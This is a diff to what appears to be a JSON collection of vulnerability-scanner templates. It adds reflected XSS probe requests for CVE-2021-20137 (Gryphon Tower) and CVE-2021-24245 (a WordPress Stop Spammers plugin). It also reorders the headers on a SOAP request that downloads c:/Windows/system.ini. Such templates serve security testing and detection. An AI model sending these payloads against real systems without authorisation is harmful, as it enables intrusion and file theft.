@@ -11159,9 +11159,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -12825,6 +12825,21 @@
       ]
     },
     {
+      "id": "CVE-2021-20137",
+      "info": {
+        "name": "Gryphon Tower - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-20150",
       "info": {
         "name": "Trendnet AC2600 TEW-827DRU - Credentials Disclosure",
@@ -13429,6 +13444,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/properties/?keyword_search=--!%3E%22%20autofocus%20onfocus%3Dalert(/{{randstr}}/)%3B%2F%2F"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24245",
+      "info": {
+        "name": "WordPress Plugin Stop Spammers 2021.8 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP+Cookie+check;\n\nlog=ad%22+accesskey%3DX+onclick%3Dalert%281%29+%22&pwd=&wp-submit=%D9%88%D8%B1%D9%88%D8%AF&redirect_to=http://localhost/wp-admin&testcookie=1\n"
           ]
         }
       ]
